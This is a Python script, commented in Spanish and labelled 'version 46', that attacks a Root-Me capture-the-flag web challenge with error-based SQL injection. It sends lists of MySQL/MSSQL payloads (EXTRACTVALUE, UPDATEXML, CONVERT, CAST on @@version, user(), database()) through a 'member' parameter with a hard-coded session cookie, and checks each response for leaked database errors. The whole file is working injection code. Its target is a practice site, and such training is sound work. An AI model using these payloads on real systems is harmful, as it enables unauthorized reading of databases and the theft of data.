#!/usr/bin/env python3
"""
SQL INJECTION ERROR-BASED - ROOT-ME CH40
VERSIÓN 46 - USAR ERRORES
"""
import requests
import time
import re

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

def test_payload(payload):
    """Prueba un payload y busca errores en la respuesta"""
    params = {"action": "member", "member": payload}
    try:
        r = requests.get(URL, params=params, cookies=COOKIE, timeout=5)
        return r.text, len(r.text)
    except:
        return "", 0

print("="*70)
print("  PROBANDO ERROR-BASED SQL INJECTION")
print("="*70)

# 1. Probar errores de conversión
print("\n[1] Probando errores de conversión:")

error_payloads = [
    "1 AND 1=CONVERT(int, @@version)",
    "1' AND 1=CONVERT(int, @@version)-- -",
    "1 AND 1=CONVERT(int, user())",
    "1 AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))",
    "1 AND EXTRACTVALUE(1, CONCAT(0x7e, user()))",
    "1 AND EXTRACTVALUE(1, CONCAT(0x7e, database()))",
    "1 AND UPDATEXML(1, CONCAT(0x7e, @@version), 1)",
    "1 AND UPDATEXML(1, CONCAT(0x7e, user()), 1)",
    "1 AND 1/0",
]

for payload in error_payloads:
    content, length = test_payload(payload)
    print(f"\n  Payload: {payload[:50]}...")
    print(f"    Length: {length}")
    
    # Buscar errores en la respuesta
    if "error" in content.lower() or "mysql" in content.lower() or "sql" in content.lower():
        print(f"    ✅ ¡ERROR ENCONTRADO!")
        # Mostrar el error
        error_match = re.search(r'error[^<]*', content, re.IGNORECASE)
        if error_match:
            print(f"    Error: {error_match.group()[:100]}")
        else:
            print(f"    Contenido: {content[:200]}...")
    else:
        print(f"    ❌ Sin errores")

# 2. Probar con CAST
print("\n[2] Probando CAST:")

cast_payloads = [
    "1 AND CAST(@@version AS SIGNED)",
    "1' AND CAST(@@version AS SIGNED)-- -",
    "1 AND CAST(user() AS SIGNED)",
    "1 AND CAST(database() AS SIGNED)",
]

for payload in cast_payloads:
    content, length = test_payload(payload)
    print(f"\n  Payload: {payload[:50]}...")
    print(f"    Length: {length}")
    
    if "error" in content.lower() or "mysql" in content.lower():
        print(f"    ✅ ¡ERROR ENCONTRADO!")
        error_match = re.search(r'error[^<]*', content, re.IGNORECASE)
        if error_match:
            print(f"    Error: {error_match.group()[:100]}")
    else:
        print(f"    ❌ Sin errores")
